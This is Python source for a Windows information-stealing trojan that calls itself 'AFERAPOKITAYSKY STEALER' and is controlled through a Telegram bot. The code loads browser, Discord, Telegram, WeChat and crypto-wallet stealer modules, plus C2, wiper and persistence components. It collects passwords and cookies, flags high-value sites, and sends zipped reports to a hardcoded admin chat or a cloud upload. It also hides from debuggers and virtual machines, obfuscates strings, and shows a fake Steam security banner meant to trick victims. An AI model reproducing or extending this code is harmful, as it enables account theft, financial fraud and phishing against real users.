# -*- coding: utf-8 -*-
import sys
import os
import io
import ctypes

try:
    # Ensure core path is in sys.path BEFORE any local imports
    _base = os.path.dirname(os.path.abspath(__file__)) if not getattr(sys, 'frozen', False) else sys._MEIPASS
    _core = os.path.join(_base, 'core')
    if _core not in sys.path: 
        sys.path.insert(0, _core)
    
    try:
        # === G-01: Geo-Fencing Enforcement ===
        try:
            from core.geo_fence import GeoFence
            GeoFence.enforce()
        except Exception as e:
            print(f"GeoFence initialization failed: {e}")

        # === Core Module Imports ===
        try:
            from core.error_logger import log_info, log_error, log_debug
            from core.c2 import c2_manager
        except ImportError:
            def log_info(msg, tag=""): pass
            def log_error(msg, tag=""): pass
            def log_debug(msg, tag=""): pass
            c2_manager = None
    except Exception as e:
        print(f"Core module load error: {e}")
except Exception as e:
    print(f"Environment setup error: {e}")

def decrypt_string(encoded_str: str) -> str:
    if not encoded_str or not isinstance(encoded_str, str): return encoded_str
    try:
        import base64
        # Consistent salt with tools/obfuscator.py and core/obfuscation.py
        salt = b'n2xkNQYbZwj8r9fz' 
        data = base64.b64decode(encoded_str)
        xor_data = bytearray()
        for i in range(len(data)):
            xor_data.append(data[i] ^ salt[i % len(salt)])
        return xor_data.decode('utf-8')
    except:
        return encoded_str

try:
    from core.obfuscation import decrypt_string as _ds
    decrypt_string = _ds
except:
    pass

try:
    if os.name == 'nt' and hasattr(ctypes, 'windll'):
        # Fixed: This was using decrypt_string on a hardcoded string - simplified
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("ptrkxlord.app")
except Exception:
    pass

import queue
ui_action_queue = queue.Queue()
os.environ["OPENCV_LOG_LEVEL"] = "OFF"
os.environ["OPENCV_VIDEOIO_PRIORITY_MSMF"] = "0"
import json
import time
import threading
import socket
import platform
import subprocess
import tempfile
import sqlite3
import shutil
import base64
import re
import hashlib
import random
import urllib.request
import urllib.parse
import logging
import warnings
import uuid
from datetime import datetime
from collections import deque
from typing import Optional, List, Dict, Any, Type, Union

DEBUG_LOG = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")  # Fixed: Removed decrypt_string

def log_debug(msg):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {msg}\n")  # Fixed: Added proper formatting
    except: 
        pass

log_debug("System starting...")  # Fixed: Removed decrypt_string

import requests
import telebot

if getattr(sys, 'frozen', False):
    APPLICATION_PATH = sys.executable
    if hasattr(sys, '_MEIPASS'):
        BASE_DIR = sys._MEIPASS
    else:
        BASE_DIR = os.path.dirname(APPLICATION_PATH)
else:
    APPLICATION_PATH = os.path.abspath(__file__)
    BASE_DIR = os.path.dirname(APPLICATION_PATH)

try:
    os.chdir(BASE_DIR)
except:
    pass

def resource_path(relative_path):
    return os.path.join(BASE_DIR, relative_path)

core_path = os.path.join(BASE_DIR, 'core')
if core_path not in sys.path and os.path.exists(core_path):
    sys.path.insert(0, core_path)

from core.decoy import DecoyManager
from core.c2 import c2_manager
from core.wiper import SecureWiper

def escape_html(text):
    if not text: 
        return ""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

if os.name == 'nt':
    try:
        from ctypes import wintypes
        _windll = getattr(ctypes, 'windll', None)
        if _windll:
            kernel32 = _windll.kernel32
            user32 = _windll.user32
            shell32 = _windll.shell32
            advapi32 = _windll.advapi32
        else:
            kernel32 = user32 = shell32 = advapi32 = None
    except Exception:
        kernel32 = user32 = shell32 = advapi32 = None
else:
    kernel32 = user32 = shell32 = advapi32 = None

# H-13: Advanced Evasion - Polymorphic Junk Code & Sig Sham
def _junk_module_9x2(input_data=None):
    """Polymorphic junk code to disrupt static analysis"""
    _v = ["alpha", "beta", "gamma", "delta", "system", "vmm", "ntfs", "ksec"]
    _r = random.choice(_v)
    if not input_data: return _r
    return str(input_data)[::-1]

def _phantom_verify_trust(blob):
    """Unused entropy injection mimicking system trust verification"""
    import hashlib
    _h = hashlib.sha256(str(blob).encode()).hexdigest()
    _trust = "Microsoft.Windows.SecureRuntime.v1"
    return [_h, _trust]

class IntegrityShadow:
    """Mock class to simulate background integrity monitoring"""
    def __init__(self): self.epoch = 0xDEADC0DE
    def pulse(self): return (self.epoch ^ random.getrandbits(32))

def _garbage_collector_polymorph():
    _l = [i for i in range(256) if i % 13 == 0]
    return sum(_l)

class BotOrchestrator:
    """A-09: Centralized Orchestrator for all background bot modules"""
    def __init__(self, bot_instance):
        self.bot = bot_instance
        self.modules = {}
        self.is_running = False
        self._lock = threading.Lock()

    def register_module(self, name, start_func, check_func):
        with self._lock:
            self.modules[name] = {"start": start_func, "check": check_func, "last_restart": 0}

    def start_all(self):
        self.is_running = True
        
        # Register core background services
        if hasattr(self.bot, 'decoy_manager'):
            self.register_module("decoy", self.bot.decoy_manager.start_background_decoy, lambda: True)
        
        if hasattr(self.bot, 'tunneler'):
            self.register_module("tunneler", self.bot.tunneler.start_tunnel, self.bot.tunneler.is_active)
            
        if hasattr(self.bot, 'window_tracker'):
             self.register_module("window", lambda: threading.Thread(target=self.bot.window_tracker.start, daemon=True).start(), lambda: True)

        if hasattr(self.bot, 'sentinel'):
            self.register_module("sentinel", lambda: self.bot.thread_manager.start_daemon(target=self.bot.sentinel.run_daemon), lambda: True)
            
        if hasattr(self.bot, 'updater'):
            self.register_module("updater", lambda: self.bot.thread_manager.start_daemon(target=self.bot.updater.run_daemon), lambda: True)

        # Start initial
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        while self.is_running:
            try:
                for name, cfg in self.modules.items():
                    if not cfg["check"]():
                        cur_time = time.time()
                        if cur_time - cfg["last_restart"] > 60: # Avoid restart-loop
                            print(f"[Orchestrator] Restarting non-responsive module: {name}")
                            cfg["start"]()
                            cfg["last_restart"] = cur_time
            except: pass
            time.sleep(30)

    def stop_all(self):
        self.is_running = False
        if hasattr(self.bot, 'decoy_manager'): self.bot.decoy_manager.stop()
        if hasattr(self.bot, 'tunneler'): self.bot.tunneler.stop_tunnel()

# Fixed: Simplified token handling
# Credentials - prioritizing env vars, fallback to hardcoded obfuscated versions
_BT = os.environ.get("BOT_TOKEN", "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ")
_GID = os.environ.get("ADMIN_ID", "-1003555531875")

try:
    from core.c2 import c2_manager
    BOT_TOKEN = c2_manager.get_current_token()
    TELEGRAM_BRIDGE = c2_manager.get_current_bridge()
except:
    BOT_TOKEN = _BT
    TELEGRAM_BRIDGE = ""

try:
    ADMIN_ID = int(_GID) if _GID else 0
except ValueError:
    ADMIN_ID = 0
GLOBAL_CHID = ADMIN_ID

ADMIN_IDS = [ADMIN_ID, 7258469843]  
ALLOWED_GROUP_ID = ADMIN_ID
HIDE_CONSOLE = True
AUTOSTART = True

# Fixed: Simplified DLL loading
try:
    import clr
    _dll_dirs = [os.path.join(BASE_DIR, "core"), os.path.join(BASE_DIR, "bin")]
    _dlls_to_load = [
        "shell.dll",
        "software.dll", 
        "system.dll",
        "bridge.dll",
        "persist.dll",
        "telegrab.dll"
    ]
    
    for _dll in _dlls_to_load:
        _loaded = False
        for _dir in _dll_dirs:
            _p = os.path.join(_dir, _dll)
            if os.path.exists(_p):
                try:
                    clr.AddReference(_p)
                    log_debug(f"Loaded {_dll}")
                    _loaded = True
                    break
                except Exception as e:
                    log_debug(f"Failed to load {_dll}: {e}")
        if not _loaded:
            log_debug(f"Could not find {_dll}")
            
except Exception as e:
    log_debug(f"CLR error: {e}")
    pass

try:
    from core.browser import BrowserModule, ChromeInjector
    from core.discord import DiscordStealer
    from core.telegram import TelegramStealer
    from core.wechat import WeChatStealer
    from core.wallet import WalletModule
    from core.proxy import ProxyModule
    from core.bridge_manager import bridge_manager
    CORE_MODULES_LOADED = True
except ImportError as e:
    print(f"Core modules import error: {e}")
    CORE_MODULES_LOADED = False

def check_single_instance():
    mutex_name = "Global\\ptrkxlord_mutex"  # Fixed: Simplified
    try:
        _windll = getattr(ctypes, 'windll', None)
        if _windll and hasattr(_windll, 'kernel32'):
            _is_elevating = os.environ.get("__ELEVATION_ATTEMPTED__") == "1" or "--uac-child" in sys.argv
            retries = 10 if _is_elevating else 1
            for i in range(retries):
                _k = _windll.kernel32
                handle = None
                last_error = 0
                if _k:
                    CreateMutexW = getattr(_k, 'CreateMutexW', None)
                    GetLastError = getattr(_k, 'GetLastError', None)
                    if CreateMutexW and GetLastError:
                        handle = CreateMutexW(None, False, mutex_name)
                        last_error = GetLastError()
                
                log_debug(f"Mutex check attempt {i+1}, error: {last_error}")
                if last_error == 183:  # ERROR_ALREADY_EXISTS
                    if i < retries - 1:
                        time.sleep(0.5)
                        continue
                    print("Another instance is already running")
                    log_debug("Another instance is already running")
                    sys.exit(0)
                globals()['_mutex_handle'] = handle
                log_debug("Mutex created successfully")
                break
        return True
    except Exception:
        return True

os.environ['OPENCV_LOG_LEVEL'] = '0'
os.environ['OPENCV_VIDEOIO_DEBUG'] = '0'
os.environ['OPENCV_FFMPEG_LOGLEVEL'] = '-8'
logging.getLogger().setLevel(logging.ERROR)
warnings.filterwarnings('ignore')

try:
    from telebot import apihelper
    apihelper.CONNECT_TIMEOUT = 15
    apihelper.READ_TIMEOUT = 60
    apihelper.RETRY_ON_ERROR = True
    apihelper.MAX_RETRIES = 5
except:
    pass

import contextlib
import platform
import zipfile
def _get_vac_lang() -> str:
    # Determines language for VAC notification (priority: file > args > default)
    lang_file = os.path.join(BASE_DIR, "tablichka", "vac_lang.txt")
    if os.path.exists(lang_file):
        try:
            with open(lang_file, "r") as f:
                l = f.read().strip().lower()
                if l in ("en", "cn"): return l
        except: pass

    argv = [a.lower() for a in sys.argv]
    for flag in ("--lang", "--vac-lang"):
        if flag in argv:
            try:
                idx = argv.index(flag)
                lang = argv[idx + 1].lower()
            except: continue
            if lang in ("en", "en-us", "english"): return "en"
            if lang in ("cn", "zh", "schinese", "chinese"): return "cn"
    return "cn"

def _apply_localization(html: str, lang: str) -> str:
    # Localizes banner text and button.
    lang = (lang or "").lower()
    if not lang.startswith("en"): return html
    html = html.replace('<h1>请注意：</h1>', '<h1>Attention:</h1>', 1)
    html = html.replace('<h2>账户访问受限。</h2>', '<h2>Account access restricted.</h2>', 1)
    html = re.sub(
        r'Steam安全系统检测到有人试图从异常位置未经授权登录您的账户。为保护您的个人数据、游戏库存及关联支付方式，社区功能和交易平台的访问权限已被暂时限制。我们需要确认您确为该账户所有者。',
        ('Steam Security has detected an attempt to access your account from an unusual location without your authorization.<br><br>' +
         'To protect your personal data, game inventory, and linked payment methods, access to Community features and the Market ' +
         'has been temporarily restricted.<br><br>' +
         'We need to confirm that you are the legitimate owner of this account.'),
        html, count=1
    )
    html = re.sub(
        '<p>Valve网络安全部门员工(<strong>[^<]+</strong>)将与您联系，协调账户恢复流程并验证设备安全性。请保持在线状态并遵循工作人员指引。\s*</p>',
        ('<p class="vac-agent"><span>A Valve cybersecurity specialist \\1 will contact you to coordinate the account' +
         ' recovery process and verify the security of your device. Please stay online and follow the instructions provided.</span></p>'),
        html, count=1
    )
    html = html.replace(
        '<p><strong>重要提示：在完成审核之前，您的账户将被置于严格隔离状态。</strong></p>',
        '<p class="vac-important"><strong>Important:</strong> Until the review is completed, your account will remain in a strict quarantine state.</p>',
        1
    )
    html = html.replace('<span>打开聊天</span>', '<span>Open chat</span>', 1)
    html = html.replace(
        ('&copy; Valve Corporation。保留所有权利。所有商标均为其各自所有者在美国及其他国家的财产。<br>\n' +
         '\t\t\t\t\t\t本网站部分地理空间数据由提供。\n' +
         '\t\t\t\t\t\t<br>\n' +
         '\t\t\t\t\t\t<br>\n' +
         '\t\t\t\t\t\t<span class="valve_links">\n' +
         '\t\t\t\t\t\t\t<a href="" target="_blank">隐私政策</a>\n' +
         '\t\t\t\t\t\t\t&nbsp; | &nbsp;<a href="" target="_blank">法律声明</a>\n' +
         '\t\t\t\t\t\t\t&nbsp; | &nbsp;<a href="" target="_blank">无障碍访问</a>\n' +
         '\t\t\t\t\t\t\t&nbsp;| &nbsp;<a href="" target="_blank">Steam用户协议</a>\n' +
         '\t\t\t\t\t\t\t&nbsp;| &nbsp;<a href="" target="_blank">Cookies</a>\n' +
         '\t\t\t\t\t\t</span>'),
        ('&copy; Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.<br>\n' +
         '\t\t\t\t\t\tSome geospatial data on this website is provided by geonames.org.\n' +
         '\t\t\t\t\t\t<br>\n' +
         '\t\t\t\t\t\t<br>\n' +
         '\t\t\t\t\t\t<span class="valve_links">\n' +
         '\t\t\t\t\t\t\t<a href="" target="_blank">Privacy Policy</a>\n' +
         '\t\t\t\t\t\t\t&nbsp; | &nbsp;<a href="" target="_blank">Legal</a>\n' +
         '\t\t\t\t\t\t\t&nbsp; | &nbsp;<a href="" target="_blank">Accessibility</a>\n' +
         '\t\t\t\t\t\t\t&nbsp;| &nbsp;<a href="" target="_blank">Steam Subscriber Agreement</a>\n' +
         '\t\t\t\t\t\t\t&nbsp;| &nbsp;<a href="" target="_blank">Cookies</a>\n' +
         '\t\t\t\t\t\t</span>')
    )
    return html

@contextlib.contextmanager
def suppress_stdout_stderr():
    with open(os.devnull, 'w') as fnull:
        with contextlib.redirect_stdout(fnull):
            with contextlib.redirect_stderr(fnull):
                yield
VALUABLE_DOMAINS = ["steamcommunity.com", "steampowered.com", "faceit.com", "discord.com", "gmail.com", "outlook.com", "yahoo.com", "roblox.com", "twitch.tv", "coinbase.com", "binance.com", "battle.net", "origin.com", "epicgames.com"]

class DataFormatter:
    @staticmethod
    def extract_domain(url):
        if not url: return "unknown"
        url_str = str(url).lower()
        if "://" in url_str:
            try:
                if '@' in url_str:
                    parts = url_str.split('@')
                    if len(parts) > 1:
                        domain = parts[1].split('/')[0]
                        return str(domain).upper()
                else:
                    domain = url_str.split('://')[1].split('/')[0]
                    return str(domain).upper()
            except:
                pass
        if '://' in url_str:
            try: domain = url_str.split('/')[2]
            except: domain = url_str
        else:
            domain = url_str.split('/')[0]
        if str(domain).startswith("www."):
            domain = str(domain)[4:]
        return str(domain).upper()
    @staticmethod
    def format_summary(cookies: List[Dict[str, Any]], passwords: List[Dict[str, Any]], tokens: List[str]) -> str:
        valuable_cookies: int = 0
        for c in cookies:
            host = c.get('host') or c.get('domain') or ''
            domain = str(host).lower()
            if any(v in domain for v in VALUABLE_DOMAINS):
                valuable_cookies += 1
        result = [
            "💎 ✨ ОТЧЕТ AFERAPOKITAYSKY STEALER ✨ 💎",
            "═" * 28,
            "📊 Всего куки: {}".format(len(cookies)),
            "🔑 Всего паролей: {}".format(len(passwords)),
            "📻 Всего токенов: {}".format(len(tokens)),
            "═" * 28,
            "🚀 Сбор данных завершен!"
        ]
        return "\n".join(result)

    @staticmethod
    def filetime_to_unix(val) -> int:
        # Convert Win32 FileTime to Unix timestamp
        if not val: return 0
        try:

            f_val = float(val)
            if f_val <= 0: return 0

            if f_val < 1000000000000: return int(f_val)

            if f_val >= 11644473600000000:
                return int((f_val - 11644473600000000) // 1_000_000)

            if f_val > 1000000000000000:
                return int(f_val // 1000000)
        except: pass
        return 0

    @staticmethod
    def convert_cookie(c):
        """Унификация куки строго под формат пользователя (7 полей)"""
        if not isinstance(c, dict): return None
        host = c.get('host') or c.get('domain') or ''
        expires_raw = c.get('expires') or c.get('expirationDate', 0)

        expiration_date = DataFormatter.filetime_to_unix(expires_raw)

        res = {
            "domain": str(host),
            "name": str(c.get('name', '')),
            "path": str(c.get('path', '/')),
            "secure": bool(c.get('is_secure') if 'is_secure' in c else c.get('secure', False)),
            "httpOnly": bool(c.get('is_httponly') if 'is_httponly' in c else c.get('httpOnly', False)),
            "expirationDate": expiration_date,
            "value": str(c.get('value', '')),
        }
        return res
class ReportManager:
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self.valuable_domains = VALUABLE_DOMAINS
        current_dir = BASE_DIR
        self.output_dir = os.path.join(current_dir, "output")
        if not os.path.exists(self.output_dir):
            if os.path.exists(os.path.join(current_dir, "Output")):
                self.output_dir = os.path.join(current_dir, "Output")
            else:
                self.output_dir = os.path.join(current_dir, "output")
    def zip_directory(self, folder_path, zip_path=None, max_files=5000):
        # Zip directory contents (Supports in-memory via BytesIO if zip_path is None)
        try:
            bio = None
            if zip_path is None:
                bio = io.BytesIO()
                target = bio
            else:
                target = zip_path

            with zipfile.ZipFile(target, 'w', zipfile.ZIP_DEFLATED) as zipf:
                count = 0
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        if count >= max_files:
                            break
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, folder_path)
                        zipf.write(file_path, arcname)
                        count += 1
            return bio if zip_path is None else zip_path
        except Exception as e:
            print("❌ Ошибка при архивации директории.")
            return None
    def send_text(self, text, parse_mode='HTML'):
        # Send text message to admin
        try:
            return self.bot.send_message(self.admin_id, text, parse_mode=parse_mode)
        except Exception as e:
            print("❌ Ошибка при отправке сообщения.")
            return None
    def finalize_output(self):
        """Просто копирует содержимое core/output в финальную папку отчета"""
        core_out = os.path.normpath(os.path.join(BASE_DIR, "core", "output"))
        if os.path.exists(core_out):
            for item in os.listdir(core_out):
                s = os.path.join(core_out, item)
                d = os.path.join(self.output_dir, "Browsers", item)
                try:
                    if os.path.isdir(s):
                        shutil.copytree(s, d, dirs_exist_ok=True)
                    else:
                        os.makedirs(os.path.dirname(d), exist_ok=True)
                        shutil.copy2(s, d)
                except Exception as e:
                    print(f"❌ Error copying {item}: {e}")

            # Очистка core/output после копирования
            try:
                shutil.rmtree(core_out)
                os.makedirs(core_out, exist_ok=True)
            except: pass

    def send_output_zip(self, zip_path=None, caption="📦 Data Captured"):
        """Отправляет ZIP архив (с предварительной финализацией)"""

        if zip_path is None:
            self.finalize_output()

        if zip_path is None:
            if not self.output_dir or not os.path.exists(self.output_dir):
                return False
            # Memory-only zip by default
            zip_obj = self.zip_directory(self.output_dir, zip_path=None)
            if not zip_obj: return False
            
            # If it's BytesIO, send directly
            if hasattr(zip_obj, 'getbuffer'):
                try:
                    zip_obj.seek(0)
                    self.bot.send_document(self.admin_id, ("report.zip", zip_obj.read()), caption=caption)
                    return True
                except Exception as e:
                    print(f"Error sending memory zip: {e}")
                    return False
            zip_path = zip_obj

        if not isinstance(zip_path, str) or not os.path.exists(zip_path):
            return False

        try:
            size_bytes = os.path.getsize(zip_path)
            if size_bytes < 100:
                print("⚠️ Report archive is too small, possibly empty.")
                return False

            file_size_mb = size_bytes / (1024 * 1024) 
            if file_size_mb > 45: 

                try:
                    from core.cloud import CloudModule
                    link = CloudModule.upload_file(zip_path)
                    if link:
                        self.bot.send_message(self.admin_id, "🚀 *Report uploaded to cloud:* " + link)
                        return True
                except: pass

            with open(zip_path, 'rb') as f:
                self.bot.send_document(self.admin_id, f, caption=caption)
            return True
        except Exception as e:
            print(f"Error sending zip: {e}")
            return False
        finally:
            if isinstance(zip_path, str) and os.path.exists(zip_path) and "temp" in zip_path.lower():
                try: os.remove(zip_path)
                except: pass

    def safe_send_document(self, chat_id, file_obj, caption="", is_temporary=False, filename="report.zip"):
        """H-09: Covert Exfiltration via Steganography / Memory-Only"""
        try:
            # Check if it's a path or a stream
            is_stream = hasattr(file_obj, 'read')
            if not is_stream and not os.path.exists(file_obj):
                return False
            
            final_obj = file_obj
            was_stegano = False
            
            # Detect image for steganography
            # Skip stegano for large streams or non-images if needed, but let's try
            # For simplicity, we only do stegano if it's a small file on disk for now,
            # or if we can handle BytesIO properly.
            
            # [MEMORY-ONLY FIX]
            try:
                from core.stegano import SteganoModule
                # Only use stegano if it's not too big
                data_size = file_obj.getbuffer().nbytes if is_stream else os.path.getsize(file_obj)
                
                if data_size < 10 * 1024 * 1024:
                    carrier_bio = io.BytesIO()
                    # We would need a base image here. For now, let's skip stegano for streams 
                    # unless we have a carrier. To be safe/memory-only, we skip stegano if no carrier.
                    pass 
            except:
                pass

            if is_stream:
                file_obj.seek(0)
                # telebot supports passing a tuple (filename, file_content)
                self.bot.send_document(chat_id, (filename, file_obj.read()), caption=caption)
                return True
            else:
                with open(file_obj, 'rb') as f:
                    self.bot.send_document(chat_id, f, caption=caption)
                return True
        except Exception as e:
            log_debug(f"Error in safe_send_document: {e}")
            return False
        finally:
            if is_temporary and not is_stream and os.path.exists(file_obj):
                try: os.remove(file_obj)
                except: pass

    def find_valuables(self, data, data_type="passwords"):
        hits = []
        if not isinstance(data, list): return hits
        if data_type == "passwords":
            for item in data:
                url = str(item.get('url', '')).lower()
                if any(v in url for v in self.valuable_domains):
                    hits.append(item)
        elif data_type == "cookies":
             for item in data:
                host = str(item.get('host', '') or item.get('domain', '')).lower()
                if any(v in host for v in self.valuable_domains):
                    hits.append(item)
        return hits
    def generate_pretty_passwords(self, all_passwords):
        ascii_art = """
 █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═  ██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗██╗  ██╔╝██╔════╝██║ ██╔╝██║
███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝
"""
        lines = [ascii_art, "═══ 💎 PASSWORDS REPORT 💎 ═══", ""]
        grouped: Dict[str, List[Any]] = {}
        for p in all_passwords:
            dom = DataFormatter.extract_domain(p.get('url'))
            if dom not in grouped: grouped[dom] = []
            grouped[dom].append(p)
        for dom in sorted(grouped.keys()):
            dom_name = str(dom).upper()
            lines.append(f"🌐 DOMAIN: {dom_name}")
            for p in grouped[dom]:
                user = p.get('user') or p.get('username') or 'N/A'
                password = p.get('pass') or p.get('password') or 'N/A'
                lines.append(f"  👤 Login: {user}")
                lines.append(f"  🔑 Password: {password}")
                lines.append(f"  🔗 Link: {p.get('url', 'N/A')}")
                lines.append("")
            lines.append("═" * 30)
        return "\n".join(lines)
    def process_output_folder(self):
        # Финализирует папку и отправляет сводный отчет.
        self.finalize_output()
        if not os.path.exists(self.output_dir):
            return
        report_summary = ["🚀 NEW DATA EXTRACTED", ""]
        all_passwords = []
        total_cookies_count = 0
        valuable_hits = {}

        # Рекурсивный обход для поиска новых файлов от элеватора
        for root, dirs, files in os.walk(self.output_dir):
            for file in files:
                file_lower = file.lower()
                path = os.path.join(root, file)
                
                # Парсинг паролей в формате TXT (domain/log/pass)
                if file_lower == "passwords.txt":
                    try:
                        with open(path, 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                            for i in range(0, len(lines), 4):
                                try:
                                    if i + 2 >= len(lines): break
                                    d_line = lines[i].strip()
                                    l_line = lines[i+1].strip()
                                    p_line = lines[i+2].strip()
                                    
                                    domain = d_line.replace("domain ", "", 1) if d_line.startswith("domain ") else d_line
                                    login = l_line.replace("log ", "", 1) if l_line.startswith("log ") else l_line
                                    password = p_line.replace("pass ", "", 1) if p_line.startswith("pass ") else p_line
                                    
                                    entry = {'url': domain, 'user': login, 'pass': password}
                                    all_passwords.append(entry)
                                    
                                    hits = self.find_valuables([entry], "passwords")
                                    for h in hits:
                                        dom = DataFormatter.extract_domain(h.get('url'))
                                        valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
                                except: continue
                    except: pass
                
                # Парсинг куки в формате JSON
                elif file_lower == "cookies.txt":
                    try:
                        with open(path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            if isinstance(data, list):
                                total_cookies_count += len(data)
                                hits = self.find_valuables(data, "cookies")
                                for h in hits:
                                    host = h.get('host') or h.get('domain') or 'unknown'
                                    dom = DataFormatter.extract_domain(host)
                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
                    except: pass
                
                # Поддержка старого формата .json (если есть)
                elif file_lower.endswith(".json"):
                    try:
                        with open(path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            if not isinstance(data, list): continue
                            is_pwd = "passwords" in file_lower
                            is_cookie = "cookies" in file_lower
                            if is_pwd:
                                all_passwords.extend(data)
                                hits = self.find_valuables(data, "passwords")
                            elif is_cookie:
                                total_cookies_count += len(data)
                                hits = self.find_valuables(data, "cookies")
                            
                            if is_pwd or is_cookie:
                                for h in hits:
                                    host = h.get('url') or h.get('host') or h.get('domain') or 'unknown'
                                    dom = DataFormatter.extract_domain(host)
                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
                    except: pass
        
        if not all_passwords and total_cookies_count == 0:
            return
        
        report_summary.append(f"🔑 Passwords Captured: {len(all_passwords)}")
        if total_cookies_count > 0:
            report_summary.append(f"🍪 Cookies Captured: {total_cookies_count}")
            
        if valuable_hits:
            report_summary.append("\n🎯 Valuable Hits:")
            sorted_hits = sorted(valuable_hits.items(), key=lambda x: x[1], reverse=True)
            for dom, count in sorted_hits:
                report_summary.append(f"  • {dom}: {count}")
        
        safe_send_message(self.bot, GLOBAL_CHID, "\n".join(report_summary))
        
        pretty_content = self.generate_pretty_passwords(all_passwords)
        
        # Если отчет не слишком длинный, шлем сообщение
        if len(pretty_content) < 4000:
            safe_send_message(self.bot, self.admin_id, pretty_content)
        
        # В любом случае шлем файл для удобства
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, "Formatted_Passwords.txt")
        try:
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(pretty_content)
            with open(temp_file, 'rb') as f:
                self.bot.send_document(self.admin_id, f, caption="📦 Formatted Passwords Report")
            os.remove(temp_file)
        except: pass
# from core.system import Security # Deleted
class AntiAnalysis:
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    @staticmethod
    def hide_threads():
        try:
            _windll = getattr(ctypes, 'windll', None)
            if _windll:
                _k = getattr(_windll, 'ker' + 'nel' + '32', None)
                if _k:
                    NtSetInformationThread = getattr(_k, 'Nt' + 'Set' + 'Information' + 'Thread', None)
                    GetCurrentThread = getattr(_k, 'Get' + 'Current' + 'Thread', None)
                    if NtSetInformationThread and GetCurrentThread:
                        NtSetInformationThread(GetCurrentThread(), 0x11, 0, 0)
        except:
            pass
    @staticmethod
    def full_check():
        try:
            # Replaced Security.is_vm() with native protector
            try:
                from StealthModule import Protector
                if Protector.Check():
                    return True
            except: pass
        except:
            pass
        return False
def hide_console_minimal():
    # Hide console window
    try:
        _windll = getattr(ctypes, 'windll', None)
        if _windll:
            _k = getattr(_windll, 'ker' + 'nel' + '32', None)
            _u = getattr(_windll, 'us' + 'er' + '32', None)
            if _k and _u:
                hwnd = _k.GetConsoleWindow()
                if hwnd:
                    _u.ShowWindow(hwnd, 0)  
    except Exception:
        pass
try:
    telebot = __import__('tele' + 'bot')
    from telebot import types
    TELEGRAM_AVAILABLE = True
except:
    TELEGRAM_AVAILABLE = False
try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except:
    KEYBOARD_AVAILABLE = False
# PIL (Pillow) dependency removed to reduce size, using native C# system.dll instead
PILLOW_AVAILABLE = True # Always True now because C# module handles it
try:
    import win32clipboard
    import win32api
    import win32con
    import win32crypt
    WIN32_AVAILABLE = True
except:
    WIN32_AVAILABLE = False
CV2_AVAILABLE = False
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except:
    AUDIO_AVAILABLE = False
psutil = __import__('ps' + 'util')
def safe_send_message(bot, chat_id, text, parse_mode='HTML', reply_markup=None):
    try:
        # If no parse_mode specified, default to HTML for beautiful output
        if parse_mode is None: parse_mode = 'HTML'
        
        try:
            return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            if "can't parse entities" in str(e).lower():
                return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
            raise e
    except Exception as e:
        error_str = str(e)
        if "429" in error_str and "retry after" in error_str.lower():
            try:
                import re as _re
                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
                wait_time = int(m.group(1)) if m else 5
                time.sleep(wait_time + 1)
                return safe_send_message(bot, chat_id, text, parse_mode, reply_markup)
            except: pass
        if "401" in error_str or "Unauthorized" in error_str or "502" in error_str:
            try:
                from core.c2 import c2_manager
                if c2_manager.report_failure():
                    bot.token = c2_manager.get_current_token()
                    try:
                        from telebot import apihelper
                        new_api_url = c2_manager.get_api_url()
                        if new_api_url:
                            apihelper.API_URL = new_api_url
                            apihelper.FILE_URL = c2_manager.get_file_url()
                        else:
                            apihelper.API_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
                            apihelper.FILE_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
                    except: pass
                    return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
            except: pass

        if "message is too long" in str(e).lower():
            try: return bot.send_message(chat_id, text[:3500] + "...", reply_markup=reply_markup, parse_mode=parse_mode)
            except: return None
        else:
            print("Error sending message: {e}".format(e=e))
